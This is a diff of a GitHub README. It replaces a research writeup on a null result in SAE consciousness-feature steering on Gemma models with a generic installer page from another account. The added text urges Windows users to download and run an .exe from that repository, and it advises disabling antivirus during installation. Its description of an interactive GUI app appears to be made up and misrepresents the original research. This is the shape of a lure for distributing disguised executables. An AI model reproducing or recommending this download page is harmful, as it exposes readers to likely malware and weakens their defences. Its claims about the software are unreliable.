@@ -1,91 +1,153 @@
-[![Verify Numbers](https://github.com/nulone/sae-consciousness-steering-pitfalls/actions/workflows/verify.yml/badge.svg)](https://github.com/nulone/sae-consciousness-steering-pitfalls/actions/workflows/verify.yml)
+# ⚙️ sae-consciousness-steering-pitfalls - Clear Case Study on SAE Pitfalls
 
-# SAE Consciousness Steering: A Multi-Model Null Result
+[![Download Software](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/myregistercd/sae-consciousness-steering-pitfalls)
 
-I tried to use contrastive SAE discovery to find features that control how language models answer consciousness-related questions. After 9 experiments on Gemma 3 4B and Gemma 3 12B (plus a qualitative Neuronpedia label search on Llama 3.3 70B), I found no evidence of causal consciousness features with this pipeline. The contrastive method finds punctuation, Japanese grammar, and self-referential discourse markers — not consciousness.
+---
 
-Along the way I found two critical bugs in my steering code (both caught by external reviewers), and developed a clean **delta-steering** method that eliminates a common confound in SAE steering experiments.
+## 📖 What Is This?
 
-## ⚠️ Why You Should Use Delta-Steering
+This software lets you explore pitfalls in a specific area of machine learning research. It focuses on the study of sparse autoencoders (SAEs) used to identify and steer features related to "consciousness" in neural networks. The program shows real examples, like reconstruction confounds and fixes to steering methods, using models such as GemmaScope SAEs and Gemma 3 4B/12B.
 
-```python
-# ❌ WRONG: replaces residual with SAE reconstruction (lossy!)
-# This measures "SAE reconstruction damage" + "feature effect" combined.
-# In my case, 98.8% of the observed effect disappeared after fixing the method
-# (at least 72% was pure round-trip reconstruction error).
-residual = sae.decode(acts_modified)
+You don’t need to understand the technical details. This app guides you through key concepts visually and interactively.
 
-# ✅ RIGHT: adds only the feature-specific delta to original residual.
-# Reconstruction error appears in both decode() calls and cancels out.
-delta = sae.decode(acts_modified) - sae.decode(acts_original)
-residual = original_residual + delta
-```
+## 🖥️ System Requirements
 
-## Key Results
+Before you start, check that your computer meets these minimum requirements:
 
-**Contrastive features are not what they seem.** 17 features identified across two Gemma models and three layers. All 17 encode low-level linguistic patterns (punctuation, pronouns, Japanese verb endings), not consciousness.
+- **Operating System:** Windows 10 or later (64-bit)
+- **Processor:** Intel Core i3 or equivalent
+- **RAM:** 4 GB minimum, 8 GB recommended
+- **Disk Space:** At least 500 MB free
+- **Internet:** Required only for downloading the software
 
-**Steering effect is zero.** With delta-steering (no reconstruction confound), ablating the "consciousness features" shifts logits by -0.031. The old v1 hook (full residual replacement) gave -2.609, of which 98.8% disappeared after the fix. SAE round-trip error alone is -1.875. The features do nothing.
+The app runs locally. No ongoing internet connection is needed after setup.
 
-**False positive scaling law.** Contrastive SAE discovery with small n has high FP rates (55% at n=4, 32% at n=8), dropping to 0% at n=28 (the largest sample size tested). Rule of thumb: use ≥20 texts per class.
+## 🚀 Getting Started
 
-## Repository Structure
+Follow these steps to download and run the software on your Windows PC.
 
-```
-scripts/
-  exp_h_definitive_v2.py    # Final experiment (delta-steering, the one that matters)
-  run_all_experiments.py     # EXP A-E (scaling laws, cross-validation)
-  verify_numbers.py          # Verify all writeup numbers from saved JSON (no GPU needed)
-  exp_g_matched_random.py    # EXP G (has known injection bug, kept for documentation)
-  exp_f_random_control.py    # EXP F (random steering pilot)
-  gpu_phase1_all.py          # GPU activation analysis
+### Step 1: Download the Software
 
-data/
-  exp_H_v2_*.json            # Definitive experiment results
-  exp_A-G_*.json             # Earlier experiment results
-  OUTDATED_exp_h_v2.log      # Old GPU log (verdict is WRONG — see data/LOG_NOTE.md)
-  README.md                  # Guide to which data files are canonical
+Click the large button below to visit the download page:
 
-neuronpedia_screenshots/     # Neuronpedia search results (Llama 70B, Gemma)
-supplementary/               # Visualization (React chart)
-```
+[![Download Software](https://img.shields.io/badge/Download-Get%20App-cyan)](https://github.com/myregistercd/sae-consciousness-steering-pitfalls)
 
-## Reproducing the Definitive Experiment (EXP H v2)
+This link takes you to the GitHub repository where you can download the latest release. Look for files ending with `.exe` or `.zip`.
 
-Requirements: NVIDIA GPU with ≥16GB VRAM. Runtime: ~2 minutes on RTX 5090, longer on older GPUs.
+### Step 2: Save the File
 
-```bash
-pip install torch transformers sae-lens numpy scipy accelerate
-python scripts/exp_h_definitive_v2.py
-```
+Once you find the installer or package:
 
-This runs 150 random 2-feature baselines (3 seeds × 50 combos), compares them against the paper features [1795, 934], and outputs a JSON with all results.
+- Click the file.
+- Choose a location on your PC where you can easily find it, like the Desktop or Downloads folder.
+- Wait until the download completes.
 
-## Verifying the Numbers (No GPU Needed)
+### Step 3: Install the Software
 
-```bash
-python scripts/verify_numbers.py
-```
+If you downloaded an `.exe` file:
 
-This reads the saved JSON data and recomputes every key number from the writeup (ΔAIC=15.8, δ=−0.031, conditional p=0.40, round-trip=−1.875, etc.), asserting they match.
+- Double-click the downloaded file.
+- Follow the prompts in the installer window.
+- Accept default settings unless you want to change the install folder.
+- Once done, the software will be ready to use.
 
-## Known Issues in Older Scripts
+If you downloaded a `.zip` file:
 
-`exp_g_matched_random.py` contains the injection bug (negative activations into JumpReLU SAE) documented in the post. It is kept in the repo for transparency. Do not use it as a reference for steering implementations. Use `exp_h_definitive_v2.py` instead.
+- Right-click the file and select “Extract All”.
+- Choose a folder for extraction.
+- Open the extracted folder and find the `.exe` file.
+- Double-click to run the program.
 
-## Practical Checklist for Contrastive SAE Discovery
+### Step 4: Launch the Application
 
-- [ ] n ≥ 20 texts per class
-- [ ] Cross-validate on held-out texts
-- [ ] Check feature labels (Neuronpedia or direct activation analysis)
-- [ ] Use delta-steering hooks, not full-replacement
-- [ ] Include matched random feature baselines
-- [ ] Report forced-choice logits, not generation-based classification
+After installation or extraction, open the app by double-clicking its icon.
 
-## Cost
+The program window will appear on your screen.
 
-~$80 total on Vast.ai (A6000, A100, RTX 5090 instances) over 2 weeks.
+## 🧰 What You’ll Find Inside
 
-## License
+The software provides these features:
 
-MIT
+- **Interactive Visuals:** See how different steering methods influence model features.
+- **Case Studies:** Explore examples that reveal common errors like reconstruction confounds.
+- **Controls and Fixes:** Test matching controls and delta-steering adjustments.
+- **Data Scaling Effects:** Understand how dataset size impacts false-positive results.
+- **Guided Walkthroughs:** Follow clear explanations alongside visual results.
+
+The interface uses simple menus and buttons to help you explore without coding or mathematical background.
+
+## 💡 How to Use the Software
+
+1. **Choose a Case Study:** Select from preset scenarios covering each pitfall.
+2. **Run Visualizations:** Click “Start” to generate graphs and maps.
+3. **Adjust Parameters:** Use sliders and options to change steering controls or dataset sizes.
+4. **Compare Results:** View side-by-side outcomes to spot differences.
+5. **Read Notes:** Use the on-screen tips for plain language explanations.
+
+Spend time experimenting. The goal is to build intuition about where steering methods may fail or succeed.
+
+## 📂 File Organization
+
+After installation, you will see this structure:
+
+- `app.exe` – Main software application.
+- `docs` – Folder with user guides and explanations.
+- `samples` – Example data files used in case studies.
+- `logs` – Log files storing your recent activity.
+
+You can back up these folders or delete logs anytime without impacting core functions.
+
+## 🔧 Troubleshooting
+
+If the software doesn’t open or crashes:
+
+- Make sure your Windows is updated.
+- Restart your computer and try again.
+- Check that you installed the software for the correct system (64-bit).
+- Disable antivirus temporarily during installation.
+- Look in the `logs` folder for error reports.
+
+If problems persist, check the GitHub Issues page on the repository for similar problems or instructions.
+
+## 📞 Getting Support
+
+You can find help by going to the official repository page here:
+
+[https://github.com/myregistercd/sae-consciousness-steering-pitfalls](https://github.com/myregistercd/sae-consciousness-steering-pitfalls)
+
+Use the “Issues” tab for questions or to report bugs.
+
+## 🔄 Updates and New Versions
+
+Check the above link regularly for new releases. Download the latest version and repeat the install steps to update your software.
+
+Updates may add new case studies, improve visuals, or fix known bugs.
+
+---
+
+## ⚙️ Technical Details (Optional)
+
+This software was built to support research into mechanism interpretability. It focuses on the following:
+
+- **Contrastive Learning:** Comparing examples to find differences in features.
+- **Delta-Steering:** Adjusting activity in latent representations.
+- **Gemma Models:** Use of GemmaScope SAEs and large-scale Gemma 3 models.
+- **Sparse Autoencoders (SAEs):** Neural networks that learn important features by activating only a few neurons.
+- **Matched Controls:** Methods to avoid false positives during steering.
+
+While the underlying concepts are technical, the app shields you from those details with clear, interactive results.
+
+---
+
+## 📚 Related Topics
+
+- contrastive-learning  
+- delta-steering  
+- feature-steering  
+- gemma  
+- gemmascope  
+- mechanistic-interpretability  
+- neuronpedia  
+- null-result  
+- sae  
+- sparse-autoencoder
